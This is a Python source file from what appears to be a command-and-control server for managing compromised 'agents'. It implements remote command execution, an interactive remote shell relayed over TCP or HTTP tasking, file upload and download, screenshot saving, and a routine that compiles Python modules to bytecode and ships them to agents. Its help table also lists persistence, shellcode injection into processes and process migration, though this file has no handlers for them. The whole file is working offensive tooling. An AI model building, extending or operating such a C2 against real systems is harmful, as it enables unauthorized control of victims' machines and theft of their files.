from core.utils import common, config
from core.agents.utils import task as taskmng, common as agcommon
from core.transport import tcp, http

import compileall
from tabulate import tabulate
from pathlib import Path
import time
import os

printer = common.Print_str()

AGENT_COMMANDS = {
    # === Session / Status ===
    "info": {
        "msg": "Show detailed system info of agent",
        "header": "SYSTEM INFO"
    },
    "tasks": {
        "msg": "Show all tasks of agent",
        "header": "TASKS"
    },
    "result": {
        "msg": "Show result of task ",
        "header": "TASKS"
    },
    # === Command Execution ===
    "cmd": {
        "msg": "Execute command on agent",
        "header": "CMD"
    },
    "shell": {
        "msg": "Stablish a shell on agent",
        "header": "SHELL"
    },
    "exec <file>": {
        "msg": "Execute uploaded binary",
        "header": "REMOTE EXECUTION"
    },

    # === Module Operations ===
    "module": {
        "msg": "Load and execute a module on agent",
        "header": "MODULE"
    },
    # === File Operations ===
    "download": {
        "msg": "Download file from agent",
        "header": "DOWNLOAD"
    },
    "upload": {
        "msg": "Upload file to agent",
        "header": "UPLOAD"
    },
    # === Lateral Movement / Persistence ===
    "persistence": {
        "msg": "Establish persistence on agent system",
        "header": "PERSISTENCE"
    },
    "inject <pid> <shellcode_file>": {
        "msg": "Inject shellcode into remote process",
        "header": "CODE INJECTION"
    },

    # === C2 / Agent Behavior ===
    "sleep <seconds>": {
        "msg": "Set agent sleep delay",
        "header": "SLEEP"
    },
    "migrate <pid>": {
        "msg": "Migrate to another process",
        "header": "PROCESS MIGRATION"
    },
    
    # === Misc ===
    "exit": {
        "msg": "Exit to previous menu ",
        "header": "HELP"
    },
    "help": {
        "msg": "Show this help message",
        "header": "HELP"
    }
}

MODULE_FOLDER = "core/modules"
MODULE_FILES = []


def tasks(agent_id):
    title = f"Agent {agent_id} tasks"
    headers = ["ID","Command", "Status", "Created At"]
    rows = []
    
    tasks = taskmng.get_all_tasks(agent_id)
    for task in tasks:
        rows.append([task.id, task.command, task.status, task.created_at])
        
    output = f"{title}\n{tabulate(rows, headers=headers, tablefmt='fancy_grid')}\n"
    return output

def result(agent_id, arg=None):
    headers = ["ID", "Command", "Result at", "Result"]
    rows = []

    if arg:
        if arg == "all":

            tasks = taskmng.get_all_tasks(agent_id)
            if not tasks:
                return printer.warning(f"No tasks found for agent {agent_id}")
            
            for task in tasks:
                rows.append([task.id, task.command, task.result_at, task.result])
            output = tabulate(rows, headers=headers, tablefmt='fancy_grid') + "\n"
            
        else:
            task = taskmng.get_task_by_id(agent_id, arg)
            if not task:
                return printer.warning(f"Task {arg} not found for agent {agent_id}")

            output = task.result
    else:
        task = taskmng.get_earliest_result(agent_id)
        if not task:
            return printer.warning("No result has been sent yet")

        output = task.result
        
    return output

def cmd(agent, cmd, conn_type):
    header = AGENT_COMMANDS.get("cmd")["header"]
    if conn_type == "tcp":
        tcp.send_data(agent.conn, cmd, header)
        _, response = tcp.recv_data(agent.conn)
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, cmd, header)
        response = printer.success(f"Task {task_id} added")
    return response

def shell(conn, agent, conn_type):
    
    header = AGENT_COMMANDS.get("shell")["header"]
    tcp.send_data(conn, f"{printer.task("Stablishing shell...")}{printer.success("Shell stablished")}", header)
    tcp.send_data(conn, "SHELL", header)
    
    if conn_type =="tcp":
        tcp.send_data(agent.conn, " ", header)
        
        while True:
            _, cmd = tcp.recv_data(conn)
            if cmd == "exit":
                tcp.send_data(agent.conn, cmd)
                _, response = tcp.recv_data(agent.conn)
                break
            tcp.send_data(agent.conn, cmd)
            _, response = tcp.recv_data(agent.conn)
            tcp.send_data(conn, response)
            
    elif conn_type == "http":
        taskmng.add_task(agent.id, "", header)
        while True:
            response = None
            
            _, cmd = tcp.recv_data(conn)
            if cmd == "exit":
                task_id = taskmng.add_task(agent.id, cmd)
                counter = 0
                while counter != 10:
                    task = taskmng.get_task_by_id(agent.id, task_id)
                    response = task.result.strip("\n")

                    if response:
                        break
                    time.sleep(1)
                    counter += 1
                    
                break
            else:
                task_id = taskmng.add_task(agent.id, cmd)
                while not response:
                    task = taskmng.get_task_by_id(agent.id, task_id)
                    response = task.result
                tcp.send_data(conn, response)
            
    return f"{printer.task("Closing shell...")}{printer.success(response)}"

def module_maker(module_name):
    module_path = f"{MODULE_FOLDER}/{module_name}.py"
    zip_path = f"{MODULE_FOLDER}/{module_name}.zip"

    imports = agcommon.find_non_builtin_imports(module_path)
    pathes = []
    for imp in imports:
        pathes.append(agcommon.find_library_path(imp))
    pathes.append(agcommon.find_library_path("__future__"))
    agcommon.zip_modules(pathes, zip_path)
        
    with open(zip_path, "rb") as f:
        zip_bytes = f.read()
        
    os.remove(zip_path)
    
    compileall.compile_file(module_path, force=True, quiet=1)
    pyc_path = f'core/modules/__pycache__/{module_name}.cpython-312.pyc'
    
    with open(pyc_path,"rb") as f:
        f.read(16)
        module = f.read()

    return zip_bytes + b"::::" + module

def callback_handler(agent_id, header, conn_type, *argv, response=None, task=None):
    if conn_type == "tcp":
    
        match header.decode():
            case "SCREENSHOT":
                file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                common.save_file(response, file_path,True)
                return f"Screenshot saved at {file_path}"
            
            case "DOWNLOAD_FILE_NOTFOUND":
                return printer.fail(f"File {response.decode()} not found")
            
            case "DOWNLOAD_FILE_OK":     
                file_name = argv[0]
                file_path = f"data/{agent_id}/download/{file_name}"
                common.save_file(response, file_path,True)
                return printer.success(f"File saved at {file_path}")
            case _:
                return response
            
    elif conn_type == "http":
    
        match header.decode():
            case "SCREENSHOT":
                response = response
                file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                common.save_file(response, file_path,True)
                return f"Screenshot saved at {file_path}".encode()
            
            case "DOWNLOAD_FILE_NOTFOUND":
                return printer.fail(f"File {response.decode()} not found")
            
            case "DOWNLOAD_FILE_OK":
                file_path = f"data/{agent_id}/download/{task.command}"
                common.save_file(response, file_path,True)
                return printer.success(f"File saved at {file_path}")
            case _:
                return response

def module(agent, arg, conn_type):
    if not arg:
        return module_help()
    global MODULE_FILES

    MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
    
    if not MODULE_FILES:
        return printer.warning("No module available")
    
    if arg == "list":
        lines = ["Available Commands:"]
        
        for module in MODULE_FILES:
            lines.append(module)
                
        return printer.info("\n".join(lines))

    module_name = arg

    if not module_name in MODULE_FILES:
        return printer.warning("Module not found")
    
    module = module_maker(module_name)

    header = AGENT_COMMANDS.get("module")["header"]
    
    if conn_type == "tcp":
        tcp.send_data(agent.conn, module, header)
        header ,response = tcp.recv_data(agent.conn, binary=True)
        response = callback_handler(agent.id, header, conn_type, response)
        
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, module_name, header, module)
        response = f"Task {task_id} added"

    return printer.success(response)


def upload(agent, data, conn_type):
    if not data:
        return printer.fail("Missing filename|bytes")

    parts = data.split(b"::::")
    if not len(parts) == 2:
        return printer.fail("Invalid filename|bytes")
    
    file_name = parts[0].decode()
        
    header = AGENT_COMMANDS.get("upload")["header"]
    if conn_type == "tcp":

        tcp.send_data(agent.conn, data, header)
        _, response = tcp.recv_data(agent.conn)
        
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, f"upload {file_name}", header, data)
        response = f"Task {task_id} added"

    return printer.success(response)

def download(agent, data, conn_type):
    if not data:
        return printer.fail("Missing filename|path")
    
    parts = data.split(b"::::")
    if not len(parts) == 2:
        return printer.fail("Invalid file_name|path")
    
    file_name = parts[0].decode()
        
    header = AGENT_COMMANDS.get("download")["header"]
    if conn_type == "tcp":

        tcp.send_data(agent.conn, data, header)
        header, response = tcp.recv_data(agent.conn, binary=True)
        response = callback_handler(agent.id, header, conn_type, file_name, response=response)
        
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, file_name, header, data)
        response = printer.success(f"Task {task_id} added")

    return response
    
def exit():
    return printer.signal("Main Menu")

# Helps

def help():
    help_lines = ["Available Commands:\n"]

    for cmd, info in AGENT_COMMANDS.items():
        msg = info["msg"] if isinstance(info, dict) else info
        help_lines.append(f"  - {cmd:<20} {msg}")
        
    return printer.info("\n".join(help_lines))

def cmd_help():
    return printer.info("Usage: cmd <command>")

def module_help():
    return printer.info("Usage: module <name> | list")

def upload_help():
    return printer.info("Usage: upload <file_name> <path>")

def download_help():
    return printer.info("Usage: download <file_name> <path>")